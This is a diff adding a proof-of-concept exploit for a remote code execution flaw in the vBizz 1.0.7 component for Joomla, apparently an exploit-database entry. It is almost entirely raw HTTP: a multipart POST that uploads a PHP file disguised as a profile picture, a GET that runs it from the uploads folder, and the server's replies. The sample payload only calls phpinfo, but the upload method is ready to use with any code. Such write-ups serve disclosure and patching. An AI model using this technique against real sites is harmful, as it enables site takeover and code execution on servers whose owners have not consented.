@@ -1,0 +1,177 @@
+# Exploit Title: Joomla! Component vBizz 1.0.7 - Remote Code Execution
+# Dork: N/A
+# Date: 2019-01-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://wdmtech.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/marketing/crm/vbizz/
+# Version: 1.0.7
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_vbizz&view=employee
+# 
+
+POST /[PATH]/index.php?option=com_vbizz&view=employee HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/octet-stream
+Content-Length: 3876
+Referer: http://localhost/[PATH]/index.php?option=com_vbizz&view=employee&task=edit&cid[0]=60
+Cookie: 84c9f7083d1056c3a8f06ae659d3db0a=9n717ao5gcu0hajds6faoqkbh3; joomla_user_state=logged_in
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-----------------------------21301381330395: undefined
+Content-Disposition: form-data; name="profile_pic"; filename="phpinfo.php"
+<?php
+phpinfo();
+?>
+-----------------------------21301381330395
+Content-Disposition: form-data; name="name"
+test
+-----------------------------21301381330395
+Content-Disposition: form-data; name="username"
+test
+-----------------------------21301381330395
+Content-Disposition: form-data; name="password"
+-----------------------------21301381330395
+Content-Disposition: form-data; name="user_role"
+11
+-----------------------------21301381330395
+Content-Disposition: form-data; name="email"
+test@test.test
+-----------------------------21301381330395
+Content-Disposition: form-data; name="empid"
+1
+-----------------------------21301381330395
+Content-Disposition: form-data; name="department"
+5
+-----------------------------21301381330395
+Content-Disposition: form-data; name="designation"
+6
+-----------------------------21301381330395
+Content-Disposition: form-data; name="phone"
+-----------------------------21301381330395
+Content-Disposition: form-data; name="gender"
+1
+-----------------------------21301381330395
+Content-Disposition: form-data; name="blood_group"
+A+
+-----------------------------21301381330395
+Content-Disposition: form-data; name="dob"
+-1-11-30
+-----------------------------21301381330395
+Content-Disposition: form-data; name="present_address"
+-----------------------------21301381330395
+Content-Disposition: form-data; name="permanent_address"
+-----------------------------21301381330395
+Content-Disposition: form-data; name="joining_date"
+-1-11-30
+-----------------------------21301381330395
+Content-Disposition: form-data; name="work_type"
+permanent
+-----------------------------21301381330395
+Content-Disposition: form-data; name="payment_type"
+bank
+-----------------------------21301381330395
+Content-Disposition: form-data; name="pan"
+-----------------------------21301381330395
+Content-Disposition: form-data; name="pf_ac"
+0
+-----------------------------21301381330395
+Content-Disposition: form-data; name="bank_ac"
+0
+-----------------------------21301381330395
+Content-Disposition: form-data; name="bank_name"
+-----------------------------21301381330395
+Content-Disposition: form-data; name="bank_branch"
+-----------------------------21301381330395
+Content-Disposition: form-data; name="ifsc"
+-----------------------------21301381330395
+Content-Disposition: form-data; name="leaving_date"
+-1-11-30
+-----------------------------21301381330395
+Content-Disposition: form-data; name="amount[]"
+111.00
+-----------------------------21301381330395
+Content-Disposition: form-data; name="payid[]"
+7
+-----------------------------21301381330395
+Content-Disposition: form-data; name="amount[]"
+0.00
+-----------------------------21301381330395
+Content-Disposition: form-data; name="payid[]"
+8
+-----------------------------21301381330395
+Content-Disposition: form-data; name="amount[]"
+0.00
+-----------------------------21301381330395
+Content-Disposition: form-data; name="payid[]"
+9
+-----------------------------21301381330395
+Content-Disposition: form-data; name="lastIncrement"
+7
+-----------------------------21301381330395
+Content-Disposition: form-data; name="option"
+com_vbizz
+-----------------------------21301381330395
+Content-Disposition: form-data; name="id"
+60
+-----------------------------21301381330395
+Content-Disposition: form-data; name="userid"
+60
+-----------------------------21301381330395
+Content-Disposition: form-data; name="task"
+
+apply
+-----------------------------21301381330395
+Content-Disposition: form-data; name="view"
+employee
+-----------------------------21301381330395--
+HTTP/1.1 303 See other
+X-Powered-By: PHP/5.6.36
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: /index.php?option=com_vbizz&view=employee&task=edit&cid[0]=60
+Last-Modified: Tue, 22 Jan 2019 21:21:40 GMT
+Content-Type: text/html; charset=utf-8
+Server: - Web acceleration by http://target/
+X-Cacheable: YES
+Content-Length: 28854
+Accept-Ranges: bytes
+Date: Tue, 22 Jan 2019 21:21:40 GMT
+X-Varnish: 561081442
+Via: 1.1 varnish
+Connection: keep-alive
+age: 0
+X-Cache: MISS
+
+GET /components/com_vbizz/uploads/profile_pics/1548192100phpinfo.php HTTP/1.1
+Host: vbizz-for-joomla.wdmtech.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: */*
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/[PATH]/index.php?option=com_vbizz&view=employee&task=edit&cid[0]=60
+Cookie: 84c9f7083d1056c3a8f06ae659d3db0a=9n717ao5gcu0hajds6faoqkbh3; joomla_user_state=logged_in
+DNT: 1
+Connection: keep-alive
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.6.36
+Content-Type: text/html; charset=UTF-8
+Server: - Web acceleration by http://target/
+X-Cacheable: YES
+Content-Length: 110286
+Accept-Ranges: bytes
+Date: Tue, 22 Jan 2019 21:21:44 GMT
+X-Varnish: 561081464
+Via: 1.1 varnish
+Connection: keep-alive
+age: 0
+X-Cache: MISS
